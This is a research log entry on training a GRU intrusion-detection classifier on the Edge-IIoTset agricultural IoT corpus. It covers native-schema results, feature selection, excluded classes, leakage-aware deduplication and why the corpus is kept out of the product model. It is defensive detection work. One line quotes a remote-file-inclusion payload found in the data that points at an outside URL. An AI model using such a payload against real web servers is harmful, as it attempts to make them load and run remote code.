# Edge-IIoTset on its native schema — a corpus cleared, and still not shipped

**Status: ✅ Measured, and deliberately not in the product model.** Source:
[`manifest_agri_native.json`](../artifacts/manifest_agri_native.json). Script:
[`run_agri_native.py`](../scripts/run_agri_native.py). Prior finding it overturns:
[`manifest_phase9_generalised.json`](../artifacts/manifest_phase9_generalised.json)
(2026-09-21).

## The question

The user fixed **smart agriculture as the deployment domain** on 2026-09-29. Edge-IIoTset is
the only registered corpus captured on agricultural equipment — soil-moisture, temperature, pH
and water-level sensors over MQTT, plus Modbus TCP — but it had been registered
`not_for_training` since 2026-09-22 on the strength of a macro-F1 of **0.12**.

The 2026-09-23 characterisation re-read had already put that figure in doubt: the 81 %
duplication it was blamed on was a property of *our packet-field reconstruction* of
CICIoT2023's window features, not of the corpus, whose raw file holds 815 exact duplicates in
2,219,201 records (0.04 %). This run is the check that entry scoped: **train the GRU on
Edge-IIoTset's own columns and see what the corpus can actually support.**

## What we achieved

**macro-F1 0.9822 ± 0.0043 over the 12 viable native classes**, 3 seeds, 20 epochs, 38.7 min.

| taxonomy | classes | macro-F1 | balanced acc. | MCC | FPR |
| --- | --- | --- | --- | --- | --- |
| **native** | 12 | **0.9822 ± 0.0043** | 0.9882 ± 0.0036 | 0.9853 | **0.0017 ± 0.0024** |
| family | 8 | 0.7453 ± 0.0013 | 0.9947 ± 0.0010 | 0.9878 | 0.0000 |

**The 0.7453 must not be quoted.** It is an artefact of the mapping, not a result:
Edge-IIoTset contains no `DoS` and no `Mirai`, so both score exactly 0.0000 inside an 8-class
macro average while the six families that exist score 0.9882–0.9997. 6/8 × 0.994 ≈ 0.745,
which is what came out. The family map also collapses Ransomware, Backdoor, SQL_injection,
Uploading and XSS into one `WebBased` class, discarding the very distinctions the corpus was
wanted for — which is why the native taxonomy is the reported one.

Per class, every class clears 0.94:

```
MITM 1.0000 · Port_Scanning 1.0000 · DDoS_TCP 0.9993 · SQL_injection 0.9981
Normal 0.9972 · Vulnerability_scanner 0.9906 · Password 0.9886 · Backdoor 0.9877
DDoS_HTTP 0.9816 · Uploading 0.9532 · XSS 0.9455 · Ransomware 0.9440
```

**The 0.12 was the translation, not the corpus.** That is now settled by measurement.

## Decisions flagged, not silently made

**The feature set is 26 behavioural columns, chosen by rule rather than by taste.** From 63
native columns: minus the spec's `drop_columns`, minus 4 zero-variance columns, minus 5 text
columns, minus **9 identifier columns** — `tcp.seq`, `tcp.ack`, `tcp.ack_raw`, `tcp.checksum`,
`icmp.checksum`, `icmp.seq_le`, `icmp.transmit_timestamp`, `udp.stream`, `mbtcp.trans_id`.
Those nine are transport nonces and capture-local counters; the spec's own rule is
"identifiers, addresses, timestamps and free text: provenance, never behaviour". What remains
is 8 MQTT fields, 2 Modbus TCP fields, and TCP/DNS/ARP/ICMP/HTTP flags, lengths and timings.
`udp.time_delta` is the native analogue of `IAT` and `tcp.len` of `Tot size`, so the
behavioural shape matches the canonical set.

**Two text columns are worse than the documented placeholder artefact.** All five carry the
known `"0"`/`"0.0"` provenance collision (arXiv 2608.15761). A whole-file census also found
`http.request.version` holding injected attack payloads
(`-al&_PHPLIB[libdir]=http://cirt.net/rfiinc.txt?? HTTP/1.1`) and `dns.qry.name.len` holding
DNS names rather than lengths — a column shift in the corpus build. Encoding either would let
the model read the attack class off the payload text. A numeric-only feature set excludes the
artefact structurally rather than by cleaning.

**Three classes are excluded by measurement, not by hand.** `--min-distinct-windows` (default
500) drops any class contributing fewer distinct windows than the threshold:

| class | distinct windows |
| --- | --- |
| **DDoS_UDP** | **1** |
| **DDoS_ICMP** | **38** |
| **Fingerprinting** | **347** |

Verified on raw strings, with no numeric coercion: **every one of the 26 features is literally
zero for every UDP and ICMP flood packet.** Those two classes are not separable even from each
other. Their only distinguishing content lived in `udp.stream`, `icmp.checksum` and
`icmp.seq_le` — the nonces leakage discipline requires dropping. `frame.time` cannot rescue
them either: the corpus build stripped month and day (`' 2021 11:44:10.081753000 '`), and
DDoS_UDP timestamps do not parse at all.

**R3 was moved to window granularity, because this corpus is packet-granularity.** Row-level
dedup deletes the repetition that *is* a flood, while the record the model consumes is a
16-packet window. The gate now dedups windows and drops any test window whose content appears
in training — **~10,400 per seed**, real leakage that would otherwise have inflated the score.
`--dedup-level` keeps the row-wise rule available as an ablation.

## Honest gaps

**434,553 rows hold only 1,791 distinct packets** (99.6 % duplicate on the 26 features). No
identical window spans the train/test split, but both sides are built from the same packet
vocabulary and differ only in *ordering*. **0.9822 is within-corpus class separation, not
demonstrated generalisation**, and no leave-one-dataset-out check is even possible here
because the feature language differs from the other two corpora.

## Why this corpus is still not in the product model

Two reasons, and the second is decisive.

**It cannot share a model.** Edge-IIoTset's value lives in `mqtt.*` and `mbtcp.*` columns that
do not exist in CICIoT2023's extractor output, and FedAvg requires an identical input width
across clients — a 26-input GRU cannot be averaged with a 16-input one. A zero-padded union of
the two vocabularies is not an escape: the model learns the zero pattern as corpus identity
and silently becomes two sub-models with inflated in-distribution numbers.

**Its unique contribution is one attack type.** Against CICIoT2023's 34 leaf classes,
Edge-IIoTset's Backdoor, MITM, SQL injection, XSS, Uploading, Password and scanning classes
are all already covered (`Backdoor_Malware`, `MITM-ArpSpoofing`, `SqlInjection`, `XSS`,
`Uploading_Attack`, `DictionaryBruteForce`, `Recon-*`). **Only Ransomware is genuinely new** —
4,517 distinct windows. That is not worth splitting the model architecture for.

The `not_for_training` registration therefore stands, with its reason string updated: the
corpus is usable on its own schema, and is excluded for feature-language incompatibility and
marginal attack coverage, not for lack of signal.

**The honest way to include it later** is a common feature extractor run over both corpora's
raw pcaps, which would give Edge-IIoTset the canonical 16 features natively and let it join a
single model exactly as CICIoMT2024 does. That needs the pcap distribution, which is not in
`data/edge_iiotset/`.
